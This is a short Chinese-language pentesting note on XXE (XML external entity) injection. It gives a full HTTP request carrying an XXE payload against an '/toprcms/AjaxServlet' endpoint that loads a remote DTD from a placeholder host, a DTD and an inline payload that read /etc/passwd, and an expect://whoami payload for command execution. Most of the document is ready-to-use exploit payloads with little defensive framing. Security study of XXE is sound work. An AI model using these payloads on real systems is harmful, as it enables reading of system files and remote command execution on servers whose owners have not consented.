<a name="P8SkT"></a>
## 条件
产生XXE有三个条件，首先是解析了XML，其次是XML外部可控。最后是没有禁用外部实体
<a name="WmGk5"></a>
## 远程文件读取
漏洞请求包

```java
POST /toprcms/AjaxServlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=C1B528DD5595209AD5EA362E9E6E8C35; SESSION_TICKET=2c969456-015d-21dd-e80e-2ea542b4c151
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 139
Content-Type: application/xml;charset=UTF-8

<!DOCTYPE foo [
    <!ENTITY  % xxe SYSTEM "http://ip/xxe.dtd" >
    %xxe;
]>
<root>
    <name>&evil;</name>
</root>
```

服务器上的dtd文件内容，然后开启http服务
```java
<!ENTITY evil SYSTEM "file:///etc/passwd" >
```

<a name="CX0BX"></a>
## 本地文件读取
```java
<!DOCTYPE foo [
    <!ENTITY  % xxe "<!ENTITY evil SYSTEM 'file:///etc/passwd'>" >
    %xxe;
]>
<root>
    <name>&evil;</name>
</root>
```
<a name="JS3iV"></a>
### 案例
例如某个站，存在上传xml的功能点，可以上传本地文件读取的xxe，然后点击预览，就触发漏洞了。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1646271830026-e312310d-ab70-48dc-9143-4aa9dc85483b.png#clientId=u715bcebf-8c8e-4&from=paste&height=365&id=uac1450de&originHeight=729&originWidth=1148&originalType=binary&ratio=1&size=334101&status=done&style=none&taskId=u24f1a298-3f4c-40dc-8efc-969be4153d8&width=574)

<a name="StjvY"></a>
## 命令执行
 PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：  
```java
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE hack[
<!ENTITY  bee SYSTEM "expect://whoami">
]>
```
